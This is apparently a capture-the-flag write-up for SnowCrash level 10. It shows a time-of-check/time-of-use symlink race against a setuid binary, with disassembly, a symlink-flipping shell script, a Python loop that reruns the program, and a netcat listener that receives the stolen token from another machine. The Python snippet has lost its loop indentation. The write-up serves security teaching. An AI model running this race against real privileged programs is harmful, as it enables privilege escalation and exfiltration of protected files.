# LEVEL 10

## Vulnerability

Race hazard with sequenced call to a access and open -> Privilege escalation via symlink attack

## External resources

nc, gdb

## Initial context

In our home directory, we have one suid/guid executable with extended permissions, and one token file:

```
level10@SnowCrash:~$ ls -l
total 16
-rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10
-rw-------  1 flag10 flag10     26 Mar  5  2016 token
```

If we run the executable, we see that it expects a file, to send it to the host.

```
level10@SnowCrash:~$ ./level10 token
./level10 file host
	sends file to host if you have access to it
```

So we have two elements to solve: privilege escalation on the file, and finding out which port to listen to enable the file transfer.

## Solving the challenge

Running ltrace on the executable tells us nothing more - but if we display its content, we see that it connects to port 6969 before reading the file and sending its content to the localhost.

```
����������Ë$Ð���������U��S������t�f����Ћ���u��[]Ð�S��[��������[�%s file host
	sends file to host if you have access to it
Connecting to %s:6969 .. Unable to connect to host %s
.*( )*.
Unable to write banner to host %s
Connected!
Sending file .. Damn. Unable to open fileUnable to read from file: %s
wrote file!You don't have access to %s
```

The first thing we should do is therefore to listen on port 6969 of our localhost:

```
[snowcrash@docker] ~/level10/Ressources # nc 6969 -l
<hanging prompt>
```

If we try passing more than one arguments to the executable, we get

```
level10@SnowCrash:~$ ./level10 /tmp/test test
Connecting to /tmp/test:6969 .. Unable to connect to host test
```

So we know that it expects an IP address as second argument, which should the one of our localhost.
We can look for it by running ifconfig and looking for the network interface selected when we set up the virtual machine's bridged network.

```
[snowcrash@docker] ~/level10/Ressources # ifconfig
(...)
wlp4s0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.0.115  netmask 255.255.255.0  broadcast 192.168.0.255
(...)
```

So we can try running the exectuable, with a test file that we own:

```
level10@SnowCrash:~$ echo "HELLO" > /tmp/test && ./level10 /tmp/test 192.168.0.115
Connecting to 192.168.0.115:6969 .. Connected!
Sending file .. wrote file!
```

And in the hanging docker container:

```
[snowcrash@docker] ~/level10/Ressources # nc 6969 -l
.*( )*.
HELLO
```

So we have successfully transfered a file that we own - now, we need to trick the program into sending a file that we don't own.

We can try, as in a previous level, to create a symlink:

```
level10@SnowCrash:~$ ln -s $(pwd)/token /tmp/token
level10@SnowCrash:~$ ./level10 /tmp/token 192.168.0.115
You don't have access to /tmp/token
```

We can run the gdb debugger to try to learn more:

```
level10@SnowCrash:~$ gdb -q
(gdb) file level10
Reading symbols from /home/user/level10/level10...done.
```

We can start by displaying the disassembly code of the main function:

```
(gdb) disas main
Dump of assembler code for function main:
   0x080486d4 <+0>:	push   %ebp
   0x080486d5 <+1>:	mov    %esp,%ebp
   0x080486d7 <+3>:	and    $0xfffffff0,%esp
   0x080486da <+6>:	sub    $0x1050,%esp
   0x080486e0 <+12>:	mov    0xc(%ebp),%eax
   0x080486e3 <+15>:	mov    %eax,0x1c(%esp)
   0x080486e7 <+19>:	mov    %gs:0x14,%eax
   0x080486ed <+25>:	mov    %eax,0x104c(%esp)
   0x080486f4 <+32>:	xor    %eax,%eax
   0x080486f6 <+34>:	cmpl   $0x2,0x8(%ebp)
   0x080486fa <+38>:	jg     0x804871f <main+75>
   0x080486fc <+40>:	mov    0x1c(%esp),%eax
   0x08048700 <+44>:	mov    (%eax),%edx
   0x08048702 <+46>:	mov    $0x8048a40,%eax
   0x08048707 <+51>:	mov    %edx,0x4(%esp)
   0x0804870b <+55>:	mov    %eax,(%esp)
   0x0804870e <+58>:	call   0x8048520 <printf@plt>
   0x08048713 <+63>:	movl   $0x1,(%esp)
   0x0804871a <+70>:	call   0x8048590 <exit@plt>
   0x0804871f <+75>:	mov    0x1c(%esp),%eax
   0x08048723 <+79>:	mov    0x4(%eax),%eax
   0x08048726 <+82>:	mov    %eax,0x28(%esp)
   0x0804872a <+86>:	mov    0x1c(%esp),%eax
   0x0804872e <+90>:	mov    0x8(%eax),%eax
   0x08048731 <+93>:	mov    %eax,0x2c(%esp)
   0x08048735 <+97>:	mov    0x1c(%esp),%eax
   0x08048739 <+101>:	add    $0x4,%eax
   0x0804873c <+104>:	mov    (%eax),%eax
   0x0804873e <+106>:	movl   $0x4,0x4(%esp)
   0x08048746 <+114>:	mov    %eax,(%esp)
   0x08048749 <+117>:	call   0x80485e0 <access@plt>
   0x0804874e <+122>:	test   %eax,%eax
   0x08048750 <+124>:	jne    0x8048940 <main+620>
   0x08048756 <+130>:	mov    $0x8048a7b,%eax
   0x0804875b <+135>:	mov    0x2c(%esp),%edx
   0x0804875f <+139>:	mov    %edx,0x4(%esp)
   0x08048763 <+143>:	mov    %eax,(%esp)
   0x08048766 <+146>:	call   0x8048520 <printf@plt>
```

We see that one of its first actions is to call the C function access(), which checks file permissions against our real user ID (different from our effective user ID, which is altered by the suid bit).

Upon doing some exploration, we find indications of a possible exploit in the man for the access system call:

> Warning: Using access() to check if a user is authorized to, for example, open a file before actually doing so using open(2) creates a security hole, because the user might exploit the short time interval between checking and opening the file to manipulate it.

or as outlined [here](https://stackoverflow.com/questions/7925177/access-security-hole)

> user executes program  
> program is setuid, immediately gets all privs of root  
> program checks file1 to ensure that user has access  
> file1 is a link to file2, which user has access to  
> user changes file1 to link to file3 (/etc/shadow or something like that)  
> program reads file1 and does something to it (print, convert, whatever)  
> user now has access to a file they shouldn't

First, let's create the file that will trick the program:

```
level10@SnowCrash:~$ touch /tmp/myfile
level10@SnowCrash:~$ ls -l /tmp/myfile
-rw-rw-r-- 1 level10 level10 0 Oct 23 22:25 /tmp/myfile
```

In order to have a link point to it, and once the access has been checked, point to the token in the home directory, we need to write a script.
Since it has no way of knowing when to time the link change, we will have it alternate indefinitely between the two states:

```
[snowcrash@docker] ~/level10/Ressources # cat create_link.sh
#!/bin/sh

while true
    do
        echo "MY LINK"
        ln -sf /tmp/myfile /tmp/token
        echo "TOKEN LINK"
        ln -sf /home/user/level10/token /tmp/token
    done
```

So we can upload it to /tmp and give execution rights:

```
[snowcrash@docker] ~/level10/Ressources # scp -P 4242 ./create_link.sh scp://level10@192.168.0.169/../../../tmp/create_link.sh
create_link.sh 100% 177 14.9KB/s 00:00
level10@SnowCrash:~$ cd /tmp && chmod +x create_link.sh
level10@SnowCrash:/tmp$ ls -l create_link.sh
-r-xrwxr-x 1 level10 level10 177 Oct 23 22:34 create_link.sh
```

Which means you can run the script in one session, and the executable in another:

```
level10@SnowCrash:/tmp\$ ./create_link.sh
MY LINK
TOKEN LINK
MY LINK
TOKEN LINK
MY LINK
TOKEN LINK
MY LINK
TOKEN LINK
MY LINK
TOKEN LINK
MY LINK
TOKEN LINK
MY LINK
TOKEN LINK
MY LINK
...
```

```
level10@SnowCrash:~\$ ./level10 /tmp/token 192.168.0.115
./level10 file host
sends file to host if you have access to it
```

However, there is still the problem of timing this; so we will use the same technique and simply run the executable until it successfully accesses the file.
For this, let's write another script:

```
[snowcrash@docker] ~/level10/Ressources # cat send_file.py
from subprocess import Popen, PIPE, call

p = Popen(["/bin/bash", "/tmp/create_link.sh"])

while True:
p2 = Popen(["./level10", "/tmp/token", "192.168.0.115"])

[snowcrash@docker] ~/level10/Ressources # scp -P 4242 ./send_file.py scp://level10@192.168.0.169/../../../tmp/send_file.py
send_file.py 100% 179 195.6KB/s 00:00
```

If we create our "trick" file and make all our files in /tmp readable and executable:

```
level10@SnowCrash:~$ echo "WRONG FILE" > /tmp/myfile
level10@SnowCrash:~$ cd /tmp && chmod 777 myfile send_file.py create_link.sh
level10@SnowCrash:/tmp\$ ls -l myfile send_file.py create_link.sh
-rwxrwxrwx 1 level10 level10 177 Oct 25 02:21 create_link.sh
-rwxrwxrwx 1 level10 level10 11 Oct 25 02:29 myfile
-rwxrwxrwx 1 level10 level10 156 Oct 25 02:28 send_file.py
```

We can run our script:

```
level10@SnowCrash:/tmp\$ cd && python /tmp/send_file.py
MY LINK
Connecting to 192.168.0.115:6969 .. Connected!
Sending file .. wrote file!
TOKEN LINK
MY LINK
You don't have access to /tmp/token
Connecting to 192.168.0.115:6969 .. TOKEN LINK
Connected!
Sending file .. wrote file!
(...)
```

Of course, we still need to be listening on the localhost, which displays:

```
[snowcrash@docker] ~/level10/Ressources # nc -lk 6969
._( )_.
WRONG FILE
._( )_.
woupa2yuojeeaaed06riuj63c
._( )_.
WRONG FILE
(...)
```
